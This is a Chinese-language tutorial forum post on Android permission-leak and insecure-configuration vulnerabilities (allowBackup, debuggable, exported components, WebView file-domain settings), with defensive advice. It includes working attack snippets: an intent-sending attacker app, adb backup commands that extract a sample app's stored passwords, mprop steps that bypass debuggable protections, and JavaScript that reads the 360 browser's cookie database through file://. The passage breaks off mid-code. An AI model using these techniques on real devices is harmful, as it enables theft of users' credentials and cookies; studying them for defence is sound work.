> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-269988.htm)

> [原创]Android APP 漏洞之战（5）——权限安全和安全配置漏洞详解

Android 漏洞之战（5）——权限安全和安全配置漏洞详解
==============================

目录

*   Android 漏洞之战（5）——权限安全和安全配置漏洞详解
*            [一、前言](#一、前言)
*            [二、Android 权限机制介绍](#二、android权限机制介绍)
*                    1. Android 权限
*                            [（1）Android 权限原理](#（1）android权限原理)
*                            [（2）Android 权限的分类](#（2）android权限的分类)
*                            [（3）权限组](#（3）权限组)
*                            [（4）如何请求权限](#（4）如何请求权限)
*                                    <1> 向清单文件中添加权限
*                                    <2> 运行时申请权限
*                            [（5）自定义权限](#（5）自定义权限)
*                                    <1> 如何定义自定义权限
*                                    <2> 自定义权限使用
*                                    <3> 自定义权限注意点
*                    [2. 权限安全种类和危害](#2.权限安全种类和危害)
*            [三、权限安全漏洞原理分析和复现](#三、权限安全漏洞原理分析和复现)
*                    [1. 漏洞原理](#1.漏洞原理)
*                    [2. 漏洞案例](#2.漏洞案例)
*                            [（1）下载文件权限泄漏漏洞](#（1）下载文件权限泄漏漏洞)
*                            [（2）猎豹清理大师内存清理权限泄漏漏洞](#（2）猎豹清理大师内存清理权限泄漏漏洞)
*                    [3. 漏洞防护](#3.漏洞防护)
*                            [（1）组件设置不可导出](#（1）组件设置不可导出)
*                            [（2）设置权限级别](#（2）设置权限级别)
*            [四、Android 默认设置介绍](#四、android默认设置介绍)
*                            [（1）AndroidManifest.xml 默认设置](#（1）androidmanifest.xml默认设置)
*                                    <1> allowBackup
*                                    <2> debuggable
*                                    <3> exported
*                            [（2）WebView 默认设置](#（2）webview默认设置)
*            [五、Android 默认设置漏洞原理分析和复现](#五、android默认设置漏洞原理分析和复现)
*                    1. allowBackup
*                            [（1）备份安全设置信息泄露漏洞](#（1）备份安全设置信息泄露漏洞)
*                                    <1> 漏洞复现
*                                    <2> 漏洞说明
*                                    <3> 安全防护
*                            （2）debuggable 安全风险
*                                    <1> 使用 mprop
*                                    <2> 使用 Xposed 模块
*                                    <3> 系统定制
*                            [（3）exported 导出漏洞](#（3）exported导出漏洞)
*                    2. WebView 安全配置漏洞
*                            [（1）漏洞原理](#（1）漏洞原理)
*                            [（2）漏洞案例](#（2）漏洞案例)
*                                    <1> WebView 密码明文存储漏洞——setSavePassword(true)
*                                    <2> **WebView 域控制不严格漏洞 **
*                            [（3）安全防护](#（3）安全防护)
*            [六、实验总结](#六、实验总结)
*            [七、参考文献](#七、参考文献)

[](#一、前言)一、前言
-------------

前几篇帖子我们将 Android 的四大组件中漏洞做了一个具体的介绍，本节我们将进一步介绍 Android 中的权限配置相关的漏洞以及 Android 安全配置漏洞，因为权限配置往往和组件关联性很大，所以大家可以结合前几篇帖子来看。2017 年权限漏洞仍占据漏洞榜单的第三名，但随着近几年的快速发展，开发人员开始不断注意对权限的安全设置，权限漏洞已经逐渐减少了。

 

本文第二节主要讲述 Android 权限机制，以及 Android 中权限所涉及的安全问题

 

本文第三节主要讲述权限安全漏洞的原理和拿两个案例复现相关的权限漏洞，并给出了相应的防护方案

 

本文第四节主要介绍 Android 中的安全配置问题，梳理了 AndroidManifest.xml 的结构注册，并讲解了相关的配置安全问题

 

本文第五节主要复现和详细介绍了 Android 安全配置中的漏洞问题

[](#二、android权限机制介绍)二、Android 权限机制介绍
------------------------------------

### 1. Android 权限

#### [](#（1）android权限原理)（1）Android 权限原理

Android 设置权限主要是为了保护 Android 用户的隐私，根据功能不同，系统会授予不同的权限，而对于用户的一些敏感数据，用户必须要申请权限之后才能访问，具体的示意图如下：

 

![](https://bbs.pediy.com/upload/attach/202110/905443_N2E4RKMNKJKN9MJ.png)

#### [](#（2）android权限的分类)（2）Android 权限的分类

从官方的文档中，我们可以知道 Android 将权限分为：`安装时权限、运行时权限和特殊权限`

```
(1)安装时权限：用户在安装应用程序时，应用程序会向用户申请的基本权限，这类权限一般被分配为：普通权限和签名权限
(2)运行时权限：Android6.0之后，Android中加入了运行时权限，应用程序在运行过程中需要访问一些敏感数据，需要向用户请求权限，这类权限被分配为：危险权限
(3)特殊权限：只有平台和原始设备制造商（OEM）可以定义，为了执行特定的操作而申请的权限，这类权限被分配为：保护权限

```

我们从上文中可以知道 Android 6.0 是一个重要节点，所以下面我们以此为界详细的描述权限的变化情况，权限的 API 参考：[权限 API 列表](https://developer.android.com/reference/android/Manifest.permission?hl=zh-cn)

 

![](https://bbs.pediy.com/upload/attach/202110/905443_WXKNJUTS2STZRMY.png)

```
危险权限的处理：
（1）Android 6.0之前应用程序会在程序安装时申请全部危险权限，一些应用可能用户不授权就无法成功安装，存在很大的安全风险
（2）Android 6.0之后应用程序在使用危险权限时，需要向用户动态申请

```

```
正常权限：manifest文件声明即可使用，安装apk时授予，app运行时不在提示
危险权限：涉及到用户隐私，用户数据相关的权限，manifest声明，代码中还要动态申请

```

#### [](#（3）权限组)（3）权限组

Android 系统对所有的`危险权限`进行了分组，称为权限组

<table><thead><tr><th><strong>权限组</strong></th><th>权限</th></tr></thead><tbody><tr><td>CALENDAR</td><td>READ_CALENDAR&lt;br/&gt;WRITE_CALENDAR</td></tr><tr><td>CAMERA</td><td>CAMERA</td></tr><tr><td>CONTACTS</td><td>READ_CONTACTS&lt;br/&gt;WRITE_CONTACTS&lt;br/&gt;GET_ACCOUNTS</td></tr><tr><td>LOCATION</td><td>ACCESS_FINE_LOCATION&lt;br/&gt;ACCESS_COARSE_LOCATION</td></tr><tr><td>MICROPHONE</td><td>RECORD_AUDIO</td></tr><tr><td>PHONE</td><td>READ_PHONE_STATE&lt;br/&gt;CALL_PHONE&lt;br/&gt;READ_CALL_LOG&lt;br/&gt;WRITE_CALL_LOG&lt;br/&gt;ADD_VOICEMAIL&lt;br/&gt;USE_SIP&lt;br/&gt;PROCESS_OUTGOING_CALLS</td></tr><tr><td>SENSORS</td><td>BODY_SENSORS</td></tr><tr><td>SMS</td><td>SEND_SMS&lt;br/&gt;RECEIVE_SMS&lt;br/&gt;READ_SMS&lt;br/&gt;RECEIVE_WAP_PUSH&lt;br/&gt;RECEIVE_MMS</td></tr><tr><td>STORAGE</td><td>READ_EXTERNAL_STORAGE&lt;br/&gt;WRITE_EXTERNAL_STORAGE</td></tr></tbody></table>

```
权限组的区别：
（1）Android 6.0-8.0：用户只要同意权限组的任意一个权限，用户则会获得此权限组的所有权限
（2）Android 9.0及以后: 用户申请某个组内的一个权限，系统不会给同组内的其他权限，用户申请哪个，系统就给哪个

```

#### [](#（4）如何请求权限)（4）如何请求权限

##### <1> 向清单文件中添加权限

```
 //声明权限 
```

无论应用需要什么权限，都需要在清单文件中对权限声明，系统会根据权限的等级来采取不同的操作，对不同的权限，系统会在安装应用时立即授予这些权限，对于危险权限，则需要用户明确授权才能获得

##### <2> 运行时申请权限

申请权限的常用步骤：

```
权限申请步骤：
1.检查有无权限
    有权限——>运行
    无权限——>申请权限
 
2.申请权限（走权限回调）
    用户同意——>运行
    用户拒绝——>展示跳转设置界面对话框
 
3.跳转设置对话框
    同意跳转——>跳转特定的权限打开界面
    用户拒绝——>Toast提示没权限，功能不能正常使用

```

**检查有无权限：**

 

应用程序需要一项危险权限，每次执行需要危险权限的操作时，都必须检查自己是否具有该权限，Android 6.0 开始，用户可以 1 随时从任何应用撤销权限，即便应用以较低的 API 为目标平台，检查应用是否具备某项权限，调用`ContextCompat.checkSelfPermission()`

```
ContextCompat.checkSelfPermission方法：检查是否具有某项权限
参数1：Context 参数2：权限名   
 
if (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.WRITE_CALENDAR)
            != PackageManager.PERMISSION_GRANTED) {
        // 权限没有被授予
    }

```

**申请权限：**

```
ActivityCompat.requestPermissions方法：
参数1：activity  参数2：要申请权限的字符串数组  参数3：请求码
 
if (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.WRITE_CALENDAR)
            != PackageManager.PERMISSION_GRANTED) {
        // 权限没有被授予，申请权限
        ActivityCompat.requestPermissions(thisActivity,new String[]{Manifest.permission.READ_CONTACTS},1);
    }

```

```
（1）requestPermissions执行时会弹系统对话框申请相关的权限。用户可以选择同意授权，或者拒绝授权。对话框关闭之后就走Activity的onRequestPermissionsResult回调了
（2）请求危险权限，之前需要在清单文件声明，否则对话框不弹，直接就是用户拒绝这个权限
（3）总之，只要使用权限就必须清单文件先声明，只是危险权限还需要动态申请

```

**对话框关闭后，请求回调:**

```
onRequestPermissionsResult方法：
参数1：请求码 参数2：请求的权限 参数3：授权结果数组
 
@Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
            @NonNull int[] grantResults){
            switch(requestCode){
                case 1:
                    if(grantResults.length>0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                        call();
                    }else{
                        //你没有授权
                        Toast.makeText("TAG", "你没有授权！", Toast.LENGTH_SHORT).show();
                    }
                    break;
                default:
            }
         }

```

```
回调函数，你授权后就会执行call(),你没有授权就会提示没有权限

```

#### [](#（5）自定义权限)（5）自定义权限

Android 中应用程序可以自定义权限来提供给其他程序访问自己的功能

##### <1> 如何定义自定义权限

我们要定义自定义权限，需要在`AndroidManifest.xml`中使用`<permission>`来声明

```
 ... 

```

```
属性说明：
(1)name：自定义权限的名字，其他app引用的名字
(2)lable：标签，用于描述该权限保护的关键功能,显示给用户的，它的值可是一个 string 数据
(3)description：描述，比 label 更长的对权限的描述。值是通过 resource 文件中获取的，不能直接写 string 值。
(4)permissionGroup：权限组，可选属性。在大多数情况下，应该将其设置为一个标准系统组（android.Manifest.permission_group），尽管可以自己定义一个组。
(5)protectionLevel：权限的等级，必须的属性

```

##### <2> 自定义权限使用

我们先在进程 1 中定义自定义权限：

```
 //自定义的权限，权限级别为 normal
    
             //为SecondActivity加上android:permission="com.example.myapp.permission.SECOND_ACTIVITY"
         
        ...... 

```

然后我们在进程 2 中声明该自定义权限：

```
 //在AndroidManifest中声明权限 
```

在进程 2 的 MainActivity 中编写代码

```
Intent intent = new Intent();
intent.setAction("com.example.jump");
intent.addCategory(Intent.CATEGORY_DEFAULT);
if (intent.resolveActivity(getPackageManager()) != null) {
    startActivity(intent);
}

```

这样我们就可以顺利从进程 2 跳转到进程 1

##### <3> 自定义权限注意点

```
（1）两个应用声明了相同的权限？
Android不允许两个不同的应用定义一个相同名字的权限（除非这两个应用拥有相同签名），所以最好不要命名相同
（2）应用安装的顺序关系
场景：APP A中声明了权限permission A，APP B中使用了权限permissionA
情况1：PermissionA的保护级别是normal或者dangerous，只能App A先安装，App B后安装，从App B打开App A一切正常，否则报错
情况2：PermissionA的保护级别是signature或者signatureOrSystem
      App B先安装，App A后安装，如果App A和App B是相同的签名，那么App B可以获取到PermissionA的权限
      如果App A和App B的签名不同，则App B获取不到PermissionA权限
      对于相同签名的app来说，不论安装先后，只要是声明了权限，请求该权限的app就会获得该权限
情况3:android:protectionLevel会影响权限在Android6.0+系统的使用
     android:protectionLevel="normal"，不需要动态申请
     android:protectionLevel="dangerous"，需要动态申请

```

### 2. 权限安全种类和危害

**权限漏洞种类：**

 

![](https://bbs.pediy.com/upload/attach/202110/905443_94X3WWMMQRRK6QE.png)

 

**安全场景：**

 

我们通过上面的分析，可以发现大部分权限安全的场景都发生在保护级别设置不当，自定义权限中如果权限控制不当，往往就会导致各种越权等安全问题的发生。我们再次看一下自定义权限的结构：

```
Normal:最低等级，系统会默认授予次权限，不会提示用户，低风险，所以的APP不能访问和共享此APP
Dangerous:系统在安装时声明此类权限的app会提示用户，是高风险，所以APP都能访问和共享此APP
Signature:权限表明的操作只针对使用同一个证书签名的app开放，是指具有相同签名的APP可以访问和共享此APP
SignatureOrSystem:系统images中APP和具有相同签名的APP可以访问和共享此APP,google建议不使用该选项，一般用于特定的一些功能

```

[](#三、权限安全漏洞原理分析和复现)三、权限安全漏洞原理分析和复现
-----------------------------------

### 1. 漏洞原理

介绍权限漏洞之前，我们先讲解一下 Android 组件基本知识，前几篇帖子我们也介绍过，Android 程序运行在独立的沙箱环境中，相互隔离，为了方便通信，Android 提供了组件间的通信（ICC）机制，允许满足条件的组件相互传递数据，ICC 的实现依赖于 Intent 和 Binder 机制，其底层是通过进程间通信来实现的。在组件的通信过程中，Intent 是数据传播的载体，通信发起方发送 Intent，携带执行的动作、动作相关的数据和附加数据等信息，通信接收方预先定义自身的 Intent-filter，intent-filter 中包含能够响应 intent 的动作和数据类型，声明能够响应的 intent 请求，应用程序框架在通信发起 Intent 后，负责找到能处理该 Intent 的接收方。

 

![](https://bbs.pediy.com/upload/attach/202110/905443_CQTJYR7EGM743JE.png)

 

组件间通信的一个前提是接收方组件必须公开，Android 中的组件分为公开组件和私有组件，具体有 export 是否可导出决定，而 Android 权限泄漏漏洞就是由于不合理的公开了组件或者没有对接收的 Intent 进行合法性校验导致，其表现为将一个拥有权限的 API 通过公开组件暴露给外界，攻击者可以构造数据访问这个 API 达到权限提升的效果，一般表现为两个方面：隐私获取和动作执行

```
隐私获取：指的是攻击者通过构造数据访问存在权限泄露漏洞的程序组件，并让该组件返回隐私数据，这些数据包括短信消息、联系人信息、地理位置、邮件信息等等
动作执行：指的是攻击者构造数据访问存在权限泄露的程序组件，让该组件执行系统破坏等恶意的操作，例如结束系统服务、拨打电话、删除程序数据等

```

具体的示意图如下所示：

 

![](https://bbs.pediy.com/upload/attach/202110/905443_X7CSYK5YCA2RU3A.png)

 

应用程序 B 是一个拥有权限 P1 的应用程序，包含组件 C1，C1 组件是公开给外界，意为 export = true，并且 C1 组件可以访问权限 P1 对应的系统资源，这样另外一个没有权限 P1 的应用程序 A，可以构造 Intent 数据去启动应用程序 B 的 C1 组件，进而访问到 P1 权限对应的系统资源，拥有权限 P1 的应用程序 B 没有对权限合理的保护，引发了权限泄漏，没有权限 P1 的应用程序 A 利用这个漏洞获得了权限，导致了权限泄漏

### 2. 漏洞案例

#### [](#（1）下载文件权限泄漏漏洞)（1）下载文件权限泄漏漏洞

**目标程序：**

 

配置文件：

代码段：

```
public class Download extends BroadcastReceiver {
 
    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        if(intent.getAction().equals("com.example.down")){
            String url = intent.getExtras().getString("url");
            String fileName = intent.getExtras().getString("fileName");
            Toast.makeText(context,"Downlaod start!"+url+"---"+fileName,Toast.LENGTH_LONG).show();
            Log.i("test",url+fileName);
        }
        //throw new UnsupportedOperationException("Not yet implemented");
    }
}

```

**攻击程序：**

```
public class MainActivity extends AppCompatActivity {
 
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = new Intent();
        intent.setAction("com.example.down");
        intent.putExtra("url","https://www.baidu.com/");
        intent.putExtra("filename","baidu");
        sendBroadcast(intent);
    }
}

```

**效果显示：**

 

测试样例：

 

![](https://bbs.pediy.com/upload/attach/202110/905443_7U75RR65J9CQ53T.png)

 

攻击样例：

 

![](https://bbs.pediy.com/upload/attach/202110/905443_M69EJHUBWXPXRRM.png)

 

我们可以很明显发现，我们可以通过进程 B 发送广播到进程 A，从而调用进程 A 的下载功能，开始下载

#### [](#（2）猎豹清理大师内存清理权限泄漏漏洞)（2）猎豹清理大师内存清理权限泄漏漏洞

这个案例是一个很早之前的漏洞，现在参考意义不大，不过大家可以借助其学习其原理即可

 

**漏洞描述：**

```
Android应用程序猎豹清理大师存在自定义的权限android.permission.RESTART_PACKAGES，该权限主要用来结束进程来达到清理内存的目的，当其他没有申请此权限的app向目标程序发送相应的intent时，便可以结束后台运行的部分app进程

```

**漏洞实现：**

 

![](https://bbs.pediy.com/upload/attach/202110/905443_W6UJZHZDHE58BUD.png)

 

![](https://bbs.pediy.com/upload/attach/202110/905443_DH7G67RJ8ANNPVQ.png)

 

![](https://bbs.pediy.com/upload/attach/202110/905443_QPFH293V9SQQJ9Z.png)

 

这就是很典型的我们利用个人定义的权限，来攻击目标程序，达到权限泄漏漏洞的目标

### 3. 漏洞防护

#### [](#（1）组件设置不可导出)（1）组件设置不可导出

我们从上面的两个案例可以发现，Android 的权限泄漏漏洞往往和四大组件相互关联，我们对一些重要组件设置不可导出，就可以达到一定的保护效果

#### [](#（2）设置权限级别)（2）设置权限级别

我们可以对自定义的权限一定要设置相应的保护级别，从上文我们可以得出：

```
android:protectionLevel="normal"，不需要动态申请
android:protectionLevel="dangerous"，需要动态申请
android:protectionLevel="signature|signatureOrSystem",需要两个程序签名相同才能访问，这样就可以很好的避免权限泄漏的风险

```

[](#四、android默认设置介绍)四、Android 默认设置介绍
------------------------------------

在上文中已经向大家详细介绍了 Android 中的权限安全漏洞的情况，接下来我们进一步了解 Android 中的默认设置以及默认设置引起的安全问题，Android 中的默认设置主要分为：AndroidManifest.xml 配置文件和 WebView 的默认设置

 

![](https://bbs.pediy.com/upload/attach/202110/905443_Z8H8HDY5NRK5RCN.png)

#### （1）AndroidManifest.xml 默认设置

这里我总结了 AndroidManifest.xml 的基本结构图

 

![](https://bbs.pediy.com/upload/attach/202110/905443_XVVS4CMA78AYKVV.png)

 

这里我们主要关注 allowBackup、Debuggable、组件默认导出

##### <1> allowBackup

Android API Level 8 及其以上 Android 系统提供了应用程序的备份和恢复功能，这是由 AndroidManifest.xml 文件中的`allowBackup`属性决定，allowBackup 标志为 true 时，用户即可通过 `adb backup` 和 `adb restore` 来进行对应用数据的备份和恢复

 

Android 属性 allowBackup 安全风险源于 adb backup 容许任何一个人能够打开 USB 调试开关，从 Android 手机中复制应用数据到外设，一旦数据被备份之后，所有应用数据都可被用户读取。`adb restore` 容许用户指定一个恢复的数据来源（即备份的应用数据）来恢复应用程序数据的创建

 

**安全影响：**

```
通讯录应用，一旦应用程序支持备份和恢复功能，攻击者即可通过 adb backup 和 adb restore 进行恢复新安装的同一个应用来查看聊天记录等信息
支付金融类应用，攻击者可通过此来进行恶意支付、盗取存款等

```

**allowBackup 安全风险详情：**

```
1.allowBackup 风险位置：AndroidMannifest.xml 文件 android:allowBackup 属性
2.allowBackup 风险触发前提条件：未将 AndroidMannifest.xml 文件中的 android:allowBackup 属性值设为 false
3.allowBackup 风险原理：当 allowBackup 标志值为 true 时，即可通过 adb backup 和 adb restore 来备份和恢复应用程序数据

```

**数据备份：**

```
命令：adb backup  [-system|nosystem] -all [-apk|-noapk] [-shared|-noshared] -f <档案名称>[需要备份的应用包名]
 
[-system|nosystem]
这个指令告诉adb在备份时是否要连同系统一起备份，若没有打开的话，默认是-system表示会一起备份系统，若连系统一起备份，在还原时候会覆盖系统档案，这对已经升级的手机是非常不好的，-nosystem是建议要打上去的指令
 
-all
这个指令除非要备份单一App不然是一定要打上去的，表示是否备份全部的App，若有加上`-nosystem`，就只会备份你目前已经安装上去的App而不会连系统App一起备份
 
[-apk|-noapk]
默认是-noapk，这个参数的意思是，是否连安装的apk一起备份，若为-noapk，则只会备份apk的资料档
 
[-shared|-noshared]
默认是`-noshared`，表示是否连手机存储空间或是SD卡的档案一起备份
 
-f
用这个来选择备份文件存储在哪里，例如-f /backup/applock.ab将会使文件存储在根磁盘（Windows的C盘等等）下一个名为backup的文件夹里，并且备份文件名为applock.ab

```

例如我们直接备份

```
adb backup  -apk  -shared  -system  -all  -f  applock.ab

```

就会在电脑默认路径下产生 applock.ab 文件，大小与系统有关

 

**查看数据：**

 

一般我们使用 abe 工具来解析 ab 文件，工具参考网址：[abe 工具](https://github.com/nelenkov/android-backup-extractor/releases)

 

解压命令：

```
java -jar ade.jar unpack 1.ab 1.tar

```

**恢复数据：**

```
adb restore applock.ab

```

##### <2> debuggable

`android:debuggable`属性是指定应用程序是否能够被调试，即时是以用户模式运行在设备上的时候，如果设置为 true ，则能够被调试，否则不能调试，默认值是 false

 

逆向工作人员在对一个 apk 程序进行逆向时，第一步往往就是要对 debuggable 属性进行绕过，否则就不能进行正常的调试，因此如果属性本身设为 true，更容易导致该应用存在动态调试，泄露数据信息的风险

 

![](https://bbs.pediy.com/upload/attach/202110/905443_Y2PA28AWXWQBUQY.png)

##### <3> exported

前几篇帖子，我们讲述四大组件过程中，经常会涉及到 exported 导出导致的漏洞，exported 组件导出，会导致导出的组件被第三方 APP 任意调用，导致敏感信息，并可能受到绕过认证、恶意代码注入等风险，由于前面我们已经讲得很详细了，这里就不再做过多描述

#### [](#（2）webview默认设置)（2）WebView 默认设置

WebView 是 android 中用来展示网页的重要控件，Android 中经常会使用 WebView 来实现 Web 页面的展示，在 Activity 中启动自己的浏览器或者简单的展示一些在线内容等，而 WebView 上的漏洞问题也各种各样，过去几年内 WebView 中被披露的重大漏洞包括了任意代码执行漏洞、跨域、密码明文保存等，后面我们将 WebView 作为一个专题讲述上面存在的漏洞问题，这里我们只关注 WebView 中默认设置的安全问题

 

后面我们主要讲述 WebView 上几方面的默认设置漏洞

 

![](https://bbs.pediy.com/upload/attach/202110/905443_U4EWKHYPP5BTR2W.png)

[](#五、android默认设置漏洞原理分析和复现)五、Android 默认设置漏洞原理分析和复现
--------------------------------------------------

### 1. allowBackup

#### [](#（1）备份安全设置信息泄露漏洞)（1）备份安全设置信息泄露漏洞

上文我们已经详细的给大家讲述了`allowBackup`设置`true`的安全性，接下来我拿一个案例带大家深入了解：

##### <1> 漏洞复现

样本：sieve.apk

 

**信息设置：**

 

首先，我们将样本安装到手机上，并打开主界面

 

![](https://bbs.pediy.com/upload/attach/202110/905443_E87D7X264BUETV4.png)

 

![](https://bbs.pediy.com/upload/attach/202110/905443_J9PHD5K2CWDGJC6.png)

 

进入主程序我们发现，提示我们注册密码，而且需要至少 16 位，这里我们输入密码`zxcvbnm0123456789`

 

进入后，又要我们输入 PIN 码，我们输入`1234`

 

![](https://bbs.pediy.com/upload/attach/202110/905443_WZ9AJS36S937GV8.png)

 

然后我们发现需要再次输入密码才能进入，我们再次输入密码

 

![](https://bbs.pediy.com/upload/attach/202110/905443_2AXNMD6EW3276RK.png)

 

发现右上角可以添加账户密码信息，我们添加，密码设置`123456`

 

![](https://bbs.pediy.com/upload/attach/202110/905443_ZE3RQ8Q6UGF2C5R.png)

 

![](https://bbs.pediy.com/upload/attach/202110/905443_KSZSD8DSRGJVNK5.png)

 

这样我们就在 apk 中就存入了一些信息，接下来我们来看如何备份和恢复这些信息呢

 

**数据备份：**

 

我们先用 jadx-gui 打开目标程序，查看 allowbackup=true

 

![](https://bbs.pediy.com/upload/attach/202110/905443_2GUXW4F9SSJUSAV.png)

 

这里发现是可以备份的，所以我们输入备份命令

```
adb backup -f allowBackup.ab -noapk com.mwr.example.sieve

```

![](https://bbs.pediy.com/upload/attach/202110/905443_JXFBT8Q2RSJA3S8.png)

 

我们的手机就弹出备份请求，如果你要加密就输入加密密码，这里我们直接备份

 

![](https://bbs.pediy.com/upload/attach/202110/905443_KTCVNM6MUJYWZD8.png)

 

备份完成后，我们在当前目录下就可以发现我们备份的文件`allowBackup.ab`

 

**数据解析：**

 

我们需要使用`abe`工具对备份的文件解压，下载路径：[`abe工具`](https://github.com/nelenkov/android-backup-extractor/releases)

 

我们下载后，需要安装 jdk 环境，然后使用命令解压：

```
java -jar abe.jar unpack allowBackup.ab 1.tar

```

![](https://bbs.pediy.com/upload/attach/202110/905443_TD2JS49JR8GVDQ8.png)

 

![](https://bbs.pediy.com/upload/attach/202110/905443_XT4JKRKT72S24YV.png)

 

解压

 

![](https://bbs.pediy.com/upload/attach/202110/905443_Y7XTNU62EQ6KGVJ.png)

 

![](https://bbs.pediy.com/upload/attach/202110/905443_FTVRXC7MHYNYJWF.png)

 

我们就得到了 database.db 数据库，然后我们使用 DB Browser for SQLite 打开，下载路径：[DB Browser](https://sqlitebrowser.org/)

 

![](https://bbs.pediy.com/upload/attach/202110/905443_8JZPXGN8638SRUN.png)

 

![](https://bbs.pediy.com/upload/attach/202110/905443_N2KVQRZC9JNRXNK.png)

 

这样我们就成功解析出了备份的数据信息

 

**数据恢复：**

 

我们卸载目标程序，然后重新安装

 

![](https://bbs.pediy.com/upload/attach/202110/905443_5E6J5YT5VYDEB3F.png)

 

我们输入恢复命令：

```
adb restore allowBackup.ab

```

![](https://bbs.pediy.com/upload/attach/202110/905443_CV268GJY4AF9VWV.png)

 

然后我们恢复数据，数据恢复完成

 

![](https://bbs.pediy.com/upload/attach/202110/905443_CM2SKVU89JN6PDA.png)

 

我们再次进入发现，直接进入之前界面，说明此时我们输入之前密码，就可以成功的进入

 

![](https://bbs.pediy.com/upload/attach/202110/905443_783KD3RF6YDANJA.png)

 

登录成功，并且出现我们之前的密码信息

##### <2> 漏洞说明

上文我们拿一个样例，带大家完整的复现了一遍数据备份漏洞的过程，这个过程中如果我们发现一个目标程序的`allowBackup`为 true，我们可以备份下其数据信息，在另外一个安装该目标程序的手机中进行恢复，这样我们就可以获得用户的敏感数据信息了，另外一个类似的案例可以参考网址：[阿里聚安全 allowBackup 安全解析](https://segmentfault.com/a/1190000002590577)

##### <3> 安全防护

只需要将 allowBackup 设置为 false 即可

#### （2）debuggable 安全风险

我们知道`debuggable=true`，用户才能进行动态调试，下面就是`debuggable=false`，使用 AndroidStudio 调试的情况

 

![](https://bbs.pediy.com/upload/attach/202110/905443_GNSFG8TXWXT9KKP.png)

 

下面我们介绍几种方法绕过`debuggle=false`

##### <1> 使用 mprop

mprop 下载地址：[mprop](https://github.com/wpvsyou/mprop)

 

原理解析：

```
通过修改 ro.debuggable =1 来达到调试的目的，由于不是从系统内核层面修改，所以系统重启之后需要重新配置

```

配置过程：

 

首先， 将 mprop 文件拷贝到./data/local/tmp 文件下

```
adb push mprop /data/local/tmp

```

然后运行

```
./mprop ro.debuggable 1

```

![](https://bbs.pediy.com/upload/attach/202110/905443_ZKKH4KPT8CDQ3XZ.png)

 

查询是否修改成功：

```
getprop ro.debuggable

```

![](https://bbs.pediy.com/upload/attach/202110/905443_TDYB7DYS9XXWRD8.png)

 

我们修改值后，还需要重启一下，使得进程被更新，使用命令

```
stop;start

```

此时我们就可以进行动态调试了

##### <2> 使用 Xposed 模块

xposed 模块中很多都可以通过 hook 来修改 `ro.debuggable`的值，这里我们使用`App Debuggable`模块，[下载地址](https://repo.xposed.info/module/cn.forgiveher.appdebuggable)

 

使用过程十分简单，我们的手机上安装 Xposed 框架之后，我们只需要将模块安装上去，激活即可，Xposed 框架安装详细看之前帖子

##### <3> 系统定制

我们也可以通过定制系统源码的方式来实现绕过，这里考虑到文章篇幅的原因，这里我收集了一个大佬的方法，相关教程我会放到 github 上，大家自行参考

#### [](#（3）exported导出漏洞)（3）exported 导出漏洞

由于 exported 导出漏洞基本是和 Android 四大组件相关，我们在前面的帖子中已经将这里讲的比较详细了，大家可以回看前面的帖子

 

**安全防护：**

```
（1）权限控制
（2）设置export = false

```

具体参考上文和前面帖子

### 2. WebView 安全配置漏洞

由于 WebView 涉及的漏洞较多，后面我会做一个专题归纳 WebView 的大部分漏洞的情况，这里只是简要列出一些配置相关的漏洞问题

#### [](#（1）漏洞原理)（1）漏洞原理

webview 控件将`setAllowFileAccessFromFileURLs`或`setAllowUniversalAcessFromFileURLsAPI`设置为`true`, 开启了 file 域访问，且允许 file 域访问 HTTP 域，但是并未对 file 域的路径做严格限制

 

检测方法：

```
webview控件是否将setAllowFileAccessFromFileURLs或setAllowUniversalAcessFromFileURLsAPI设置为true
客户端是否对file://路径进行严格限制

```

#### [](#（2）漏洞案例)（2）漏洞案例

##### <1> WebView 密码明文存储漏洞——setSavePassword(true)

WebView 默认开启密码保存功能 mWebView.setSavePassword(true)，如果该功能未关闭，在用户输入密码时，会弹出提示框，询问用户是否保存密码，如果用户确定，密码会被保存在`/data/data/com.package.name/databases/webview.db`，然后我们可以在 root 权限下直接拿出密码相关信息，因此建议用户密码加密存储

##### <2> **WebView 域控制不严格漏洞**

**setAllowFileAccess**

 

WebView 默认开启密码保存功能 mWebView.setAllowFileAccess(true) ，在 File 域下，能够执行任意的 JavaScript 代码，同源策略跨域访问能够对私有目录文件进行访问，APP 对切入 WebView 未对 file:/// 形式的 URL 做限制，会导致隐私信息泄漏，针对聊天软件会导致信息泄漏，针对浏览器软件，会导致 cookie 信息泄漏

 

**setAllowFileAccessFromFileURLs**

 

在 JELLY_BEAN 以前的版本默认是 setAllowFileAccessFromFileURLs(true), 允许通过 file 域 url 中的 Javascript 读取其他本地文件，在 JELLY_BEAN 及以后的版本中默认已被是禁止。

 

**setAllowUniversalAccessFromFileURLs**

 

在 JELLY_BEAN 以前的版本默认是 setAllowUniversalAccessFromFileURLs(true), 允许通过 file 域 url 中的 Javascript 访问其他的源，包括其他的本地文件和 http,https 源的数据。在 JELLY_BEAN 及以后的版本中默认已被禁止。

 

**案例：360 手机浏览器缺陷可导致用户敏感数据泄漏**

 

以 360 手机浏览器 4.8 版本为例，由于未对 file 域做安全限制，恶意 APP 调用 360 浏览器加载本地的攻击页面（比如恶意 APP 释放到 SDCARD 上的一个 HTML）后，就可以获取 360 手机浏览器下的所有私有数据，包括 webviewCookiesChromium.db 下的 cookie 内容

 

攻击页面关键代码

```
function getDatabase() { 
 
    var request = false;
 
    if(window.XMLHttpRequest) {
 
     request = new XMLHttpRequest();
 
      if(request.overrideMimeType) {
 
           request.overrideMimeType('text/xml');}
 
    }
 
    xmlhttp = request;
 
    var prefix = "file:////data/data/com.qihoo.browser/databases";
 
    var postfix = "/webviewCookiesChromium.db"; //取保存cookie的db
 
    var path = prefix.concat(postfix);
 
    // 获取本地文件代码
 
    xmlhttp.open("GET", path, false);
 
    xmlhttp.send(null);
 
    var ret = xmlhttp.responseText;
 
    return ret;
 
}

```

漏洞利用代码：

```
copyFile(); //自定义函数，释放filehehe.html到sd卡上
 
String url = "file:///mnt/sdcard/filehehe.html";
 
